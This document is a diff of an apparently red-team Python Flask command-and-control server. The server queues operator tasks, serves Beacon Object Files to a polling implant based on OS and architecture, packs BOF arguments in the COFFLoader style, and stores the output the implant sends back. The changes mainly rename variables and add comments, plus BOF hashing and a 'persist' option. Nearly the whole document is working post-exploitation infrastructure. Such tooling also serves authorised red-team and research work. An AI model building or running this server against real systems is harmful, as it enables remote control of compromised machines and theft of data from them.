@@ -15,23 +15,28 @@ bofsRootDir = "/bofs/"
 """
 Structure of tasks:
 cmdData0 = {
-	"name" : "bof:udpScanner",
-	"argv" : "8.8.8.8:53",
 	"header" : "thread:zb",
+	"argv" : "8.8.8.8:53",
 	"buffer" : "file:udpPayloads.txt",
+	"name" : "bof:udpScanner",
 };
 
 cmdData1 = {
-	"name" : "bof:uname",
-	"argv" : "-r",
 	"header" : "inline:z",
+	"argv" : "-r",
+	"name" : "bof:uname",
 };
 """
 
-taskFifo = deque()
+# Fifo queue of tasks to execute by implant
+# POST request to /tasking endpoint adds (appendLeft) a new task to it
+# GET request to /endpoint endpoint pops a task (if available) from it and starts processing it
+TaskFifo = deque()
 
-inputDict = dict()
-outputDict = dict()
+# Repositories of tasks' input data (sent from operator) and tasks' output data (sent back from implant)
+# stored under reqID keys 
+InputDict = dict()
+OutputDict = dict()
 
 # borrowed from https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py
 class BeaconPack:
@@ -78,7 +83,7 @@ def addTask():
         reqData['id'] = secrets.token_hex()
         # convert JSON request to string and append it to task FIFO
         data = json.dumps(reqData)
-        taskFifo.appendleft(data) 
+        TaskFifo.appendleft(data) 
         return "<p>Consumed</p>"
 
 
@@ -86,29 +91,36 @@ def addTask():
     resp = []
     resp.append("<p>Pending tasks queue:</p>")
 
-    for task in taskFifo:
+    for task in TaskFifo:
         resp.append(task + '<br/>')
 
     resp.append("<p>Tasks history:</p>")
 
-    for key, value in inputDict.items():
-        if key in outputDict:
+    for key, value in InputDict.items():
+        if key in OutputDict:
             resp.append(value + '<br/>')
-            resp.append(outputDict[key].decode('utf-8') + '<br/><br/>')
+            resp.append(OutputDict[key].decode('utf-8') + '<br/><br/>')
     
     str_out = ''.join(resp)
     return str_out
 
+# GET /endpoint - check if task is available
+# POST /endpoint - send in task's output data
 @app.route("/endpoint", methods=['GET', 'POST'])
 def heartbeat():
 
+    # get implant's output data and add it to the output's store under 'reqID' key
     if request.method == 'POST':
         reqID = request.headers.get('Authorization')
         data = base64.b64decode(request.get_data())
-        outputDict[reqID] = data
+        OutputDict[reqID] = data
         return ""
 
-    # get arch and os from 'Authorization' header
+    # abort, if there are no tasks to process
+    if len(TaskFifo) == 0:
+        return "nothing to do"
+
+    # get implant's identification data encoded in 'Authorization' header
     authz = base64.b64decode(request.headers.get('Authorization')).decode('utf-8')
     if not authz:
         return "go away"
@@ -121,39 +133,57 @@ def heartbeat():
     else:
         os = "elf"
 
-    if len(taskFifo) == 0:
-        return "nothing to do"
-
-    # get tasking data and process it
-    data = taskFifo.pop()
-    cmdData = json.loads(data)
+    # get tasking data from TaskFifo and prepare for processing it
+    data = TaskFifo.pop()
+    cmdData = json.loads(data) # deserialize to JSON
     reqID = cmdData['id']
-    inputDict[reqID] = data
 
-    resp = {
-        "id": cmdData['id'],
+    # store task's input data for logging purposes
+    InputDict[reqID] = data
+
+    # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
+    Instruction = {
+        "id": reqID,
         "name": cmdData['name'],
-        "header": cmdData['header'],
     }
 
-    # prepare 'path' field for bofs
+    # we're dealing with BOF execution task, so let's:
+    # 1. prepare path/URI for the BOF in case when downloading it will be needed
+    # 2. calculate requested BOF's hash
+    # 3. add bof_hash to the header field
+    # 4. if 'persist' is in the header, put it at the end
     if 'bof:' in cmdData['name']:
+        # prepare instruction's: 'path' field for bofs
         _, name = cmdData['name'].split(':')
-        resp['path'] = bofsRootDir + name + "." + os + "." + arch + ".o"
+        bofHttpPath = bofsRootDir + name + "." + os + "." + arch + ".o"
+        Instruction['path'] = bofHttpPath
+        bofLocalPath = bofHttpPath.lstrip('/')
 
-    header = cmdData['header']
+        # calculate BOF's hash
+        with open(bofLocalPath, 'rb') as f:
+            bof_hash = format(abs(hash(f.read())), 'x')
+
+        header = cmdData['header']
+        if 'persist' in header:
+            # replace 'persist' for bof_hash in header and then append 'persist'
+            header = header.replace("persist", bof_hash)
+            Instruction['header'] = header + ":persist"
+        else:
+            # append hash to the header:
+            Instruction['header'] = header + ":" + bof_hash
+
     args_spec = header.split(':')[1]
 
-    # check if 'header' contains buffer:
+    # check if args_spec from header contains a buffer ("b"):
     for c in args_spec:
         # buffer in 'header'
         if c == 'b':
             if 'file:' in cmdData['buffer']:
                 _, path = cmdData['buffer'].split(':')
                 with open(path, 'rb') as f:
-                     resp['buffer'] = base64.b64encode(f.read()).decode('utf-8')
+                     Instruction['buffer'] = base64.b64encode(f.read()).decode('utf-8')
             else:
-                resp['buffer'] = base64.b64encode(cmdData['buffer'])
+                Instruction['buffer'] = base64.b64encode(cmdData['buffer'])
             # we're done, remove 'b' character
             args_spec = args_spec.replace('b', '')
 
@@ -175,11 +205,11 @@ def heartbeat():
             elif args_spec[i] == 'i':
                 ArgsPack.addint(arg_list[i])
             i += 1
-        resp ['args'] = base64.b64encode(ArgsPack.getbuffer()).decode('utf-8')
+        Instruction['args'] = base64.b64encode(ArgsPack.getbuffer()).decode('utf-8')
         #TODO: in implant allocate buffer if present and add to bof_args
 
-    
-    return resp
+    # return Implant's Instruction for execution
+    return Instruction 
 
 @app.route(bofsRootDir + '<path:path>')
 def send_report(path):
